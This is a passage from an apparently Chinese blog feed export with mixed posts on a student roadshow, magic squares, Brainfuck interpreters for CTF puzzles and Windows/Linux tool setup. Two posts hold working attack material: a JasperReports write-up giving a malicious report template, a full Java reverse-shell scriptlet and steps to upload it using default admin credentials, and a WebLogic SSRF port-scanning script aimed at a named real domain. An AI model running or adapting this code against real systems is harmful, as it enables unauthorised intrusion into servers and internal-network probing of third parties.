      <content type="text"><![CDATA[​ 已经很晚了，一般是不写这种文章的，但这次去北京的确有很多收获和感悟，所以想在此记录一下。 ​ 这次北京之行的路演，依旧按照平时的答辩模式，最终也取得了不错的效果。百度的负责人对我们团队印象很深，也是三人团队的配合还不错，所以 最终也取得了不错的成绩。当然这次收获最大的并不是我们团队的表现，而是其它大学的。北邮的乐享奇迹科技有限公司给我的印象很深，他们有一个很完善的团队组织架构，并且基于一个预约平台衍生出了很多APP；还有第二组那个研究生基于原来学长的东西进一步完善，这也是一个思路；而后就是那个博士生的盲人系统，很有想法；最后是那个外卖APP，市场调查做的很详细。 ​ 总之，我觉得，对于社团而言也可以开发一些这种核心的东西作为一种积累；还有就是成立公司。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hacking JasperReports-隐藏shell的特征]]></title>
      <url>%2F2017%2F01%2F22%2FHacking-JasperReports-%E9%9A%90%E8%97%8Fshell%E7%9A%84%E7%89%B9%E5%BE%81%2F</url>
      <content type="text"><![CDATA[不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。 也没有用多久我们就猜解出密码是“jasperadmin” 我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。 代码和小脚本JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。 JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。 我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。 编辑模板我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。 shell.jrxml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;&lt;!-- 2016-10-04T14:01:12 --&gt;&lt;jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842" whenNoDataType="AllSectionsNoDetail" columnWidth="515" leftMargin="40" rightMargin="40" topMargin="50" bottomMargin="50" isSummaryWithPageHeaderAndFooter="true" uuid="17f4b3c5-e096-4a65-b030-ed3bb58ce311"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.language" value="EN-US"/&gt;&lt;style name="Sans_Normal" isDefault="true" fontName="DejaVu Sans" fontSize="12"/&gt;&lt;style name="Sans_Bold" fontName="DejaVu Sans" fontSize="12" isBold="true"/&gt;&lt;style name="Sans_Italic" fontName="DejaVu Sans" fontSize="12" isItalic="true"/&gt;&lt;style name="PageHeader" style="Sans_Bold" forecolor="#FFFFFF" backcolor="#333333"/&gt;&lt;style name="detail" fontName="DejaVu Sans" fontSize="12"&gt;&lt;conditionalStyle&gt;&lt;conditionExpression&gt;&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;&lt;/conditionExpression&gt;&lt;style mode="Opaque" backcolor="#E0E0E0"/&gt;&lt;/conditionalStyle&gt;&lt;/style&gt;&lt;subDataset name="Table Dataset 1" uuid="4fcc1d09-9859-48ee-bb6f-8d369bd49113"&gt;&lt;queryString&gt;&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;&lt;/queryString&gt;&lt;field name="name" class="java.lang.String"/&gt;&lt;field name="phone_office" class="java.lang.String"/&gt;&lt;field name="billing_address_city" class="java.lang.String"/&gt;&lt;field name="billing_address_street" class="java.lang.String"/&gt;&lt;field name="billing_address_country" class="java.lang.String"/&gt;&lt;sortField name="billing_address_country"/&gt;&lt;sortField name="billing_address_city"/&gt;&lt;variable name="CityyNumber" class="java.lang.Integer" incrementType="Group" incrementGroup="CityGroup" calculation="Count"&gt;&lt;variableExpression&gt;&lt;![CDATA[Boolean.TRUE]]&gt;&lt;/variableExpression&gt;&lt;initialValueExpression&gt;&lt;![CDATA[new Integer(0)]]&gt;&lt;/initialValueExpression&gt;&lt;/variable&gt;&lt;group name="CityGroup"&gt;&lt;groupExpression&gt;&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;&lt;/groupExpression&gt;&lt;/group&gt;&lt;/subDataset&gt;&lt;scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet"&gt;&lt;scriptletDescription&gt;&lt;![CDATA[]]&gt;&lt;/scriptletDescription&gt;&lt;/scriptlet&gt;&lt;title&gt;&lt;band height="79" splitType="Stretch"&gt;&lt;textField&gt;&lt;reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/band&gt;&lt;/title&gt;&lt;pageFooter&gt;&lt;band height="40"&gt; &lt;line&gt;&lt;reportElement x="0" y="10" width="515" height="1" uuid="19826638-0487-4bb5-9b15-7e7af63b8dce"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.table" value="end"/&gt;&lt;/reportElement&gt;&lt;/line&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement x="200" y="20" width="80" height="16" uuid="6f072af1-756c-49f4-82f3-af59e8124296"/&gt;&lt;textElement textAlignment="Right"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;textField isStretchWithOverflow="true" evaluationTime="Report"&gt;&lt;reportElement x="280" y="20" width="75" height="16" uuid="02b15e9e-d360-4b82-a140-54b9bd3b0e81"/&gt;&lt;textElement textAlignment="Left"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/band&gt;&lt;/pageFooter&gt;&lt;summary&gt;&lt;band height="149" splitType="Stretch"&gt;&lt;image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon"&gt;&lt;reportElement positionType="Float" x="0" y="71" width="250" height="70" uuid="aa8a8976-039f-45ac-84f3-d8d55b442410"/&gt;&lt;imageExpression&gt;&lt;![CDATA["repo:LogoLink"]]&gt;&lt;/imageExpression&gt;&lt;hyperlinkTooltipExpression&gt;&lt;![CDATA["JasperReports Logo"]]&gt;&lt;/hyperlinkTooltipExpression&gt;&lt;/image&gt;&lt;image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon"&gt;&lt;reportElement positionType="Float" x="265" y="71" width="250" height="70" uuid="4b5dd0d1-9011-42cf-ab07-f80c02d3d166"/&gt;&lt;imageExpression&gt;&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;&lt;/imageExpression&gt;&lt;hyperlinkTooltipExpression&gt;&lt;![CDATA["Jaspersoft Logo"]]&gt;&lt;/hyperlinkTooltipExpression&gt;&lt;/image&gt;&lt;componentElement&gt;&lt;reportElement key="table" x="0" y="0" width="515" height="70" uuid="db3dd84a-3743-43b3-ab7e-c4aebdb907df"/&gt;&lt;jr:table xmlns:jr="http://jasperreports.sourceforge.net/jasperreports/components" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd" whenNoDataType="AllSectionsNoDetail"&gt;&lt;datasetRun subDataset="Table Dataset 1" uuid="3b2a079f-f600-46a6-a7af-720c4e939e7e"&gt;&lt;connectionExpression&gt;&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;&lt;/connectionExpression&gt;&lt;/datasetRun&gt;&lt;jr:columnGroup width="515" uuid="1e5d630a-c8f9-4dbb-8415-393f7624ca35"&gt;&lt;jr:groupHeader groupName="CityGroup"&gt;&lt;jr:cell height="30" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="Sans_Bold" positionType="Float" mode="Opaque" x="0" y="14" width="515" height="16" isPrintWhenDetailOverflows="true" backcolor="#C0C0C0" uuid="aeafecc2-ef7e-435c-ae07-1f45ed6b179a"/&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid"/&gt;&lt;/box&gt;&lt;textElement textAlignment="Left"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;anchorNameExpression&gt;&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;&lt;/anchorNameExpression&gt;&lt;/textField&gt;&lt;/jr:cell&gt;&lt;/jr:groupHeader&gt;&lt;jr:column width="30" uuid="43ffff20-e89f-4f73-ad8d-878e9581274a"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="30" height="16" isPrintWhenDetailOverflows="true" uuid="a76dcb9c-8601-48bc-b9cc-3d1c316e537d"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.colspan" value="1"/&gt;&lt;/reportElement&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" "]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="30" height="20" isPrintWhenDetailOverflows="true" uuid="73a40f28-2c08-4849-a2a9-b83ade7a6b7d"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="10"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textElement textAlignment="Right"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="240" uuid="d472eeed-282a-402b-9044-a397ca270655"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="240" height="16" isPrintWhenDetailOverflows="true" uuid="bd0d4582-5684-4e15-8623-b3f1940bf1bb"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.colspan" value="2"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Name"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell style="detail" height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="240" height="20" isPrintWhenDetailOverflows="true" uuid="23562605-5611-41d8-8a40-98ad9d28834a"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;name&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="100" uuid="4612e5a3-cb0d-4533-9b54-9ad9828acbed"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="100" height="16" isPrintWhenDetailOverflows="true" uuid="d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="10" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Phone"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="100" height="20" isPrintWhenDetailOverflows="true" uuid="e48d7dee-a092-45ea-8bd8-8440f76a9fd0"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="145" uuid="f0397b7d-4130-4b13-88b1-d89415b269bd"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="145" height="16" isPrintWhenDetailOverflows="true" uuid="0a1206b8-d0d6-4809-a424-3d7f09606b44"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Address"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="145" height="20" isPrintWhenDetailOverflows="true" uuid="7bc63c7e-0224-441b-96ec-8a1bb67a0b84"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="0"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;/jr:columnGroup&gt;&lt;/jr:table&gt;&lt;/componentElement&gt;&lt;/band&gt;&lt;/summary&gt;&lt;/jasperReport&gt;接下来看42行：&lt;textFieldExpression&gt;&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;&lt;/textFieldExpression&gt;这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。&lt;scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet"&gt;&lt;scriptletDescription&gt;&lt;![CDATA[]]&gt;&lt;/scriptletDescription&gt;&lt;/scriptlet&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101这很简单,但这在Java代码本身是如何定义的呢?编写攻击脚本scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从"here"中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：package foxglove.shell;import java.io.*;import java.net.*;import java.io.InputStream;import java.io.OutputStream;import java.io.DataInputStream;import net.sf.jasperreports.engine.JRDefaultScriptlet;import net.sf.jasperreports.engine.JRScriptletException; public class ShellScriptlet extends JRDefaultScriptlet implements Runnable&#123; Socket socket; PrintWriter socketWrite; BufferedReader socketRead; PrintWriter commandWrite; BufferedReader commandRead; static String ip; int port = 8080; public String getShell()&#123; ip = "1.1.1.1"; ShellScriptlet shell = new ShellScriptlet(); shell.establishConnection(); new Thread(shell).start(); shell.getCommand(); return "DONE"; &#125; public void run()&#123; spawnShell(); &#125; public void spawnShell()&#123; boolean windows = false; try&#123; if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)&#123; windows = true; &#125; Runtime rt = Runtime.getRuntime(); Process p; if(windows) p = rt.exec("C:\\Windows\\System32\\cmd.exe"); else p = rt.exec("/bin/sh"); InputStream readme = p.getInputStream(); OutputStream writeme = p.getOutputStream(); commandWrite = new PrintWriter(writeme); commandRead = new BufferedReader(new InputStreamReader(readme)); if(windows) commandWrite.println("dir"); else commandWrite.println("ls -al"); commandWrite.flush(); String line; while((line = commandRead.readLine()) != null)&#123; socketWrite.println(line); socketWrite.flush(); &#125; p.destroy(); &#125;catch(Exception e)&#123;&#125; &#125; public void establishConnection()&#123; try&#123; socket = new Socket(ip,port); socketWrite = new PrintWriter(socket.getOutputStream(),true); socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream())); socketWrite.println("---Connection has been established---"); socketWrite.flush(); &#125;catch(Exception e)&#123;&#125; &#125; public void getCommand()&#123; String foo; try&#123; while((foo=socketRead.readLine())!= null)&#123; commandWrite.println(foo); commandWrite.flush(); &#125; &#125;catch(Exception e)&#123;&#125; &#125; public static void main(String args[])&#123; ShellScriptlet r = new ShellScriptlet(); r.getShell(); &#125;&#125; 对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中 1/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d . 这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！ 接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它： 1/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/ 如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！ 部署这个新的“Report”每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。 首先很明显我们要去验证一下“jasperadmin/jasperadmin”： 在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。 接下来，我们只要右击一个report并且点击“Edit”就好。 一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果： 点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果： Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样： 现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈 Shellz!先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！ 之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[洛书中的数字规律]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%B4%9B%E4%B9%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%A7%84%E5%BE%8B%2F</url>
      <content type="text"><![CDATA[数字规律编辑 那么河图洛书中真的隐含着宇宙之理吗？其内容又是什么呢？我在这里只能先谈洛书，即九宫图。把九宫图中的数字排列来进行详解一番，或可看出一定道理来。首先在九宫图中数字之和等于十五，这一点恐怕所有的人都知道，就是横坚斜相加都等于十五。 4+9+2=15 3+5+7=15 8+1+6=15 4+3+8=15 9+5+1=15 2+7+6=15 4+5+6=15 2+5+8=15 除此之外，还有什么数字玄机呢？ a+b+c=d+e+f a^2+b^2+c^2=d^2+e^2+f^2 我们以左列的438与右列的276为例加以说明。当我们把数递变为两位数相加时，左右两列数字之和依然相等。即43+38+84=27+76+62。从下向上递变依然成立。即83+34+48=67+72+26。 递变为三位数依然相等，即438+384+843=276+762+627。 从下向上递数依然成立，即834+348+483=672+726+267。 再这样递变下去为四位数、五位数、六位数，一百位数、一千位数依然成立。神奇之处还不在这里，更为神奇的是不管是一位，还是两位数三位数的平方相加和依然可以左右相等。比如两位数即43^2+38^2+84^2=27^2+76^2+62^2。 三位数四位数平方和依然可以成立。也就是说一百位也好一千位也好都可以成立。这个数字的神奇排列真是让我莫名惊诧。 再有就是把九宫图用行列式的方法计算，可以得到一个周天数360。在这些数字面前，我不敢想象，这样一个数字排竟然有着不可思议的魔力。 det[4 ，9， 2；3，5，7；8，1，6]=360 就是这样的一个九宫数的排列解开了美国数学家提出的数学怪题，严格等平方和的问题，当时可是无人能解的数学怪题，就连计算机都无能为力。结果被研究洛书的彭绍定数学教授攻克。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Brainfuck]]></title>
      <url>%2F2017%2F01%2F22%2FBrainfuck%2F</url>
      <content type="text"><![CDATA[一些隐写题中可能会出此现这种东西，下面我来大概介绍一下： 官方网站: http://www.muppetlabs.com/~breadbox/bf/ BrainFuck, (An Eight-Instruction Turing-Complete Programming Language), 这个语言本身的语言模型很简单, 有一个byte指针, 有一个初始化为0长度为30000 bytes的数组, byte指针可以在数组内任意移动, 支持下面的八种操作, 指针初始化指向数组的开始. 这个语言只是作者为了写一个很简单的编译器, 才设计的一门语言, 语言和名字一样, 很难读懂, 简单的一些操作用BrainFuck来写都很复杂难读. 八种操作符定义如下: 字符 含义 &gt; 指针加一 &lt; 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCII码） , 输入内容到指针指向的单元（ASCII码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 Brainfuck程序可以用下面的替换方法翻译成C语言(假设ptr是char*类型)： Brainfuck C &gt; ++ptr; &lt; –ptr; + ++*ptr; - –*ptr; . putchar(*ptr); , *ptr =getchar(); [ while (*ptr) { ] } 举个例子： ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++.&gt;+.+++++++..+++.&lt;&lt;++.&gt;+++++++++++++++.&gt;.+++.------.--------.&lt;&lt;+.&lt;. 这个编译后就是 ‘Hello World!’ 其实只要工具就好了！！！贴一个python实现的解释器： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import os import sys def mainloop(program, bracket_map): pc = 0 tape = Tape() while pc &lt; len(program): code = program[pc] if code == "&gt;": tape.advance() elif code == "&lt;": tape.devance() elif code == "+": tape.inc() elif code == "-": tape.dec() elif code == ".": # print os.write(1, chr(tape.get())) elif code == ",": # read from stdin tape.set(ord(os.read(0, 1)[0])) elif code == "[" and tape.get() == 0: # Skip forward to the matching ] pc = bracket_map[pc] elif code == "]" and tape.get() != 0: # Skip back to the matching [ pc = bracket_map[pc] pc += 1 class Tape(object): def __init__(self): self.thetape = [0] self.position = 0 def get(self): return self.thetape[self.position] def set(self, val): self.thetape[self.position] = val def inc(self): self.thetape[self.position] += 1 def dec(self): self.thetape[self.position] -= 1 def advance(self): self.position += 1 if len(self.thetape) &lt;= self.position: self.thetape.append(0) def devance(self): self.position -= 1 def parse(program): parsed = [] bracket_map = &#123;&#125; leftstack = [] pc = 0 for char in program: if char in ('[', ']', '&lt;', '&gt;', '+', '-', ',', '.'): parsed.append(char) if char == '[': leftstack.append(pc) elif char == ']': left = leftstack.pop() right = pc bracket_map[left] = right bracket_map[right] = left pc += 1 return "".join(parsed), bracket_map def run(fp): program_contents = "" while True: read = os.read(fp, 4096) if len(read) == 0: break program_contents += read os.close(fp) program, bm = parse(program_contents) mainloop(program, bm) if __name__ == '__main__': run(os.open(sys.argv[1], os.O_RDONLY, 0777))#用法：python brain.py flag.br#在.br文件中保存BrainFuck的代码 c编写的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950include &lt;stdio.h&gt;;int p, r, q;char a[5000], f[5000], b, o, *s=f;void interpret(char *c)&#123; char *d; r++; while( *c ) &#123; switch(o=1,*c++) &#123; case '&lt;': p--; break; case '&gt;': p++; break; case '+': a[p]++; break; case '-': a[p]--; break; case '.': putchar(a[p]); fflush(stdout); break; case ',': a[p]=getchar();fflush(stdout); break; case '[': for( b=1,d=c; b &amp;&amp; *c; c++ ) b+=*c=='[', b-=*c==']'; if(!b) &#123; c[-1]=0; while( a[p] ) interpret(d); c[-1]=']'; break; &#125; case ']': puts("UNBALANCED BRACKETS"), exit(0); case '#': if(q&gt;2) printf("%2d %2d %2d %2d %2d %2d %2d %2d %2d %2d/n%*s/n", *a,a[1],a[2],a[3],a[4],a[5],a[6],a[7],a[8],a[9],3*p+2,"^"); break; default: o=0; &#125; if( p&lt;0 || p&gt;100) puts("RANGE ERROR"), exit(0); &#125; r--;&#125;void main(int argc,char *argv[])&#123; FILE *z; q=argc; if(z=fopen(argv[1],"r")) &#123; while( (b=getc(z))&gt;0 ) *s++=b; *s=0; interpret(f); &#125;&#125; 编译一下就可以用了。 嗯，就这些。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win7使用wget]]></title>
      <url>%2F2017%2F01%2F22%2Fwin7%E4%BD%BF%E7%94%A8wget%2F</url>
      <content type="text"><![CDATA[一、下载官网：http://gnuwin32.sourceforge.net/packages/wget.htm 下载地址：http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe 二、安装与系统环境变量配置2.1 安装双击一步步安装即可 2.2 配置系统环境变量在“Path”变量中添加：;E:\DevTools\GnuWin32\bin]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux下使用锐捷的方法]]></title>
      <url>%2F2017%2F01%2F22%2FLinux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[其实很简单一个命令就搞定（前提是你有这个脚本） 12345678910111213#下载之后先解压：unzip RuijieForLinux.zip#之后cd 进去#在然后呢sudo chmod +x ./rjsupplicant.sh#再然后呢sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源 第一次使用时，可以通过 –help命令查看使用帮助文档 贴个效果图：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Weblogic_SSRF]]></title>
      <url>%2F2017%2F01%2F22%2FWeblogic-SSRF%2F</url>
      <content type="text"><![CDATA[Weblogic_SSRF的一个利用脚本 123456789101112131415161718192021222324252627282930313233343536373839import sysimport requestsdef scan(ip_str):#元组ports = ('21','22','23','53','80','135','139','443','445','1080','1433','1521','3306','3389','4899','8080','7001','8000',)for port in ports:# %d 是整形通配符,%s是字符串通配符exp_url = "http://www.faw.com.cn/uddiexplorer/SetupUDDIExplorer.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"%(ip_str,port)try:response = requests.get(exp_url, timeout=1, verify=False)if response.status_code == 200 and 'weblogic.uddi.client.structures.exception.XML_SoapException' in response.content:print ip_str+':' + port + ' --open'except Exception, e:passdef find_ip(ip_prefix):for i in range(190,200):scan('%s.%s'%(ip_prefix,i))if __name__ == "__main__":commandargs = sys.argv[1]args = "".join(commandargs)#将列表数据以‘’中的字符链接ip_prefix = '.'.join(args.split('.')[:-1])find_ip(ip_prefix)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CTF中那些有趣的混淆]]></title>
